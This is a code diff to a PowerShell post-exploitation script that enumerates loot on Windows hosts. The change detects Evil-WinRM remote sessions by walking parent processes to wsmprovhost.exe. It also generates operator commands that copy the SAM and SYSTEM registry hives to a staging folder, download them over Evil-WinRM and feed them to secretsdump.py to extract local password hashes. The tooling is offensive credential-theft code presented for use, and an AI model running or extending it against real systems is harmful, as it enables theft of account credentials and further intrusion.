@@ -21,7 +21,7 @@ param(
 )
 
 $ErrorActionPreference = "SilentlyContinue"
-$Version = "1.9.9-en-ps"
+$Version = "1.9.10-en-ps"
 # English-first output: reliable under Evil-WinRM / EN-US consoles (Chinese often shows as ???).
 $script:DomainCtx = $null
 $script:AlreadySystem = $false
@@ -228,13 +228,26 @@ function Get-CurrentSids {
 
 $script:MySids = Get-CurrentSids
 
+function Get-Win32ProcessById([int]$ProcessId) {
+    if ($ProcessId -le 0) { return $null }
+    try {
+        return Get-CimInstance -ClassName Win32_Process -Filter "ProcessId=$ProcessId" -ErrorAction Stop
+    } catch {
+        try {
+            return Get-WmiObject -Class Win32_Process -Filter "ProcessId=$ProcessId" -ErrorAction Stop
+        } catch { return $null }
+    }
+}
+
 function Test-IsEvilWinRMSession {
     <#
     .SYNOPSIS
       Detect WinRM remoting host used by Evil-WinRM (and Enter-PSSession).
     .NOTES
-      Server cannot see the client binary name. Signals: PS Host.Name + parent wsmprovhost.exe.
-      When true, Next text may use Evil-WinRM client verbs (download/upload).
+      Server cannot see the client binary name.
+      Signals: Host.Name, PSSenderInfo, OR ancestor process wsmprovhost.exe.
+      Nested "powershell -File script.ps1" under Evil-WinRM is ConsoleHost with
+      parent powershell.exe; must walk the parent chain (not only immediate parent).
     #>
     try {
         if ($Host -and $Host.Name -eq 'ServerRemoteHost') { return $true }
@@ -242,23 +255,25 @@ function Test-IsEvilWinRMSession {
     try {
         if ($PSSenderInfo) { return $true }
     } catch {}
-    $parentName = $null
-    try {
-        $cur = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId=$PID" -ErrorAction Stop
-        if ($cur -and $cur.ParentProcessId) {
-            $par = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId=$($cur.ParentProcessId)" -ErrorAction Stop
-            if ($par) { $parentName = [string]$par.Name }
-        }
-    } catch {
-        try {
-            $cur = Get-WmiObject -Class Win32_Process -Filter "ProcessId=$PID" -ErrorAction Stop
-            if ($cur -and $cur.ParentProcessId) {
-                $par = Get-WmiObject -Class Win32_Process -Filter "ProcessId=$($cur.ParentProcessId)" -ErrorAction Stop
-                if ($par) { $parentName = [string]$par.Name }
-            }
-        } catch {}
+
+    # Walk parents: powershell -File -> powershell (WinRM) -> wsmprovhost.exe
+    $walkId = $PID
+    $seen = @{}
+    for ($i = 0; $i -lt 12; $i++) {
+        if ($seen.ContainsKey($walkId)) { break }
+        $seen[$walkId] = $true
+        $proc = Get-Win32ProcessById $walkId
+        if (-not $proc) { break }
+        $name = [string]$proc.Name
+        if ($name -match '(?i)^wsmprovhost(\.exe)?$') { return $true }
+        # Some hosts show the executable path instead of short name
+        $cmd = [string]$proc.CommandLine
+        if ($cmd -match '(?i)\\wsmprovhost(\.exe)?(\s|$)') { return $true }
+        $ppid = 0
+        try { $ppid = [int]$proc.ParentProcessId } catch { $ppid = 0 }
+        if ($ppid -le 0 -or $ppid -eq $walkId) { break }
+        $walkId = $ppid
     }
-    if ($parentName -and ($parentName -match '(?i)^wsmprovhost(\.exe)?$')) { return $true }
     return $false
 }
 
@@ -277,6 +292,8 @@ function Join-NextLines {
 function Get-EvilWinRMLootNext {
     param(
         [string]$LocalPath = "",
+        [string]$SamPath = "",
+        [string]$SystemPath = "",
         [ValidateSet("hive","pair","system","admin","generic")][string]$Kind = "generic"
     )
     if (-not $script:IsEvilWinRM) { return "" }
@@ -293,10 +310,12 @@ function Get-EvilWinRMLootNext {
             ) -join "`n"
         }
         "pair" {
+            $sam = if ($SamPath) { $SamPath } else { "C:\Windows.old\Windows\System32\config\SAM" }
+            $sys = if ($SystemPath) { $SystemPath } else { "C:\Windows.old\Windows\System32\config\SYSTEM" }
             return @(
                 "# Evil-WinRM: stage both hives then download from client:",
-                "copy /y C:\Windows.old\Windows\System32\config\SAM $stage\",
-                "copy /y C:\Windows.old\Windows\System32\config\SYSTEM $stage\",
+                "copy /y `"$sam`" $stage\",
+                "copy /y `"$sys`" $stage\",
                 "download $stage\SAM",
                 "download $stage\SYSTEM",
                 "# Prefer same tree for both files; then secretsdump.py -sam SAM -system SYSTEM LOCAL"
@@ -1095,6 +1114,8 @@ function Test-OsLootCatalog {
     $seenH = @{}
     $haveSam = $false
     $haveSystem = $false
+    $firstSamPath = $null
+    $firstSystemPath = $null
     foreach ($p in $candidatesHive) {
         if (-not $p) { continue }
         $k = $p.ToLowerInvariant()
@@ -1109,8 +1130,14 @@ function Test-OsLootCatalog {
         $isLiveConfig = $p -match '(?i)^[A-Z]:\\Windows\\System32\\config\\(SAM|SYSTEM|SECURITY)$'
 
         if ($st.Ok) {
-            if ($base -ieq 'SAM') { $haveSam = $true }
-            if ($base -ieq 'SYSTEM') { $haveSystem = $true }
+            if ($base -ieq 'SAM') {
+                $haveSam = $true
+                if (-not $firstSamPath) { $firstSamPath = $p }
+            }
+            if ($base -ieq 'SYSTEM') {
+                $haveSystem = $true
+                if (-not $firstSystemPath) { $firstSystemPath = $p }
+            }
             $hiveNext = if ($script:IsEvilWinRM) {
                 Get-EvilWinRMLootNext -LocalPath $p -Kind hive
             } else {
@@ -1141,9 +1168,11 @@ function Test-OsLootCatalog {
 
     if ($haveSam -and $haveSystem) {
         $pairNext = if ($script:IsEvilWinRM) {
-            Get-EvilWinRMLootNext -Kind pair
+            Get-EvilWinRMLootNext -Kind pair -SamPath $firstSamPath -SystemPath $firstSystemPath
         } else {
-            "# Prefer copies from the same Windows tree (e.g. both under Windows.old)`n# secretsdump.py -sam SAM -system SYSTEM LOCAL"
+            $sHint = if ($firstSamPath) { "copy /y `"$firstSamPath`" %TEMP%\" } else { "# copy SAM" }
+            $yHint = if ($firstSystemPath) { "copy /y `"$firstSystemPath`" %TEMP%\" } else { "# copy SYSTEM" }
+            "# Prefer copies from the same Windows tree (e.g. both under Windows.old)`n$sHint`n$yHint`n# secretsdump.py -sam SAM -system SYSTEM LOCAL"
         }
         Add-Finding HIGH "Readable SAM + SYSTEM pair available" `
             "You have both hive types readable. Copy offline and extract local account hashes on the attack host." `
